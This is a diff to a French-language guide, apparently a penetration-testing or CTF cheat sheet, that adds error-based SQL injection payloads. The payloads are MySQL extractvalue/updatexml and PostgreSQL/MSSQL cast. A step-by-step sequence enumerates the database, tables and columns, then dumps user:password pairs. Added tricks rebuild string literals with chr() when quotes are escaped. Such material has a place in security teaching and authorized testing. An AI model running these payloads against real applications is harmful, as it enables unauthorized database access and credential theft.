@@ -216,17 +216,34 @@ Forcer une erreur (division par zéro) quand la condition est vraie ; pas d'erre
 
 ### Exploiter un message d'erreur verbeux
 
-Quand la base renvoie le détail de l'erreur, on y lit la donnée directement. Le payload dépend du SGBD (cf. Recon étape 2 + table de correspondance).
+Prérequis : l'erreur SQL complète s'affiche dans la page. On force une erreur qui embarque la donnée. Payload selon SGBD (cf. table de correspondance).
 
-1. Vérifier que le point est exploitable.
-2. Vérifier la syntaxe :
+Point d'injection selon contexte (Recon 1) : `,PAYLOAD` en ORDER BY, `'||PAYLOAD||'` en string literal.
 
 ```text
-'--
+MySQL — extractvalue (tronque à 32 car.) :   ,extractvalue(1,concat(0x7e,(SQ)))
+                     updatexml (idem)     :   ,updatexml(1,concat(0x7e,(SQ)),1)
+PostgreSQL / MSSQL — cast (pas de troncature) :   ,cast((SQ) as int)
 ```
 
-3. Respecter les conditions de la requête.
-4. Chercher les infos sensibles dans le message renvoyé.
+Séquence d'extraction (exemple PostgreSQL, contexte ORDER BY) :
+
+```text
+1. base      ,cast((SELECT current_database()) as int)
+2. tables    ,cast((SELECT string_agg(table_name,',') FROM information_schema.tables
+                    WHERE table_schema=current_schema()) as int)
+3. colonnes  ,cast((SELECT string_agg(column_name,',') FROM information_schema.columns
+                    WHERE table_name='T') as int)
+4. dump      ,cast((SELECT string_agg(user||':'||pass,',') FROM T) as int)
+```
+
+Si quotes échappées (Recon 3), reconstruire sans littéral :
+
+```text
+'public' → current_schema()      ',' → chr(44)      ':' → chr(58)
+'T'      → sous-requête (SELECT table_name FROM ... LIMIT 1 OFFSET n)
+Table et colonnes dans FROM/SELECT = identifiants → écrits en clair, pas de quote.
+```
 
 ### Exploiter avec les délais de réponse
 
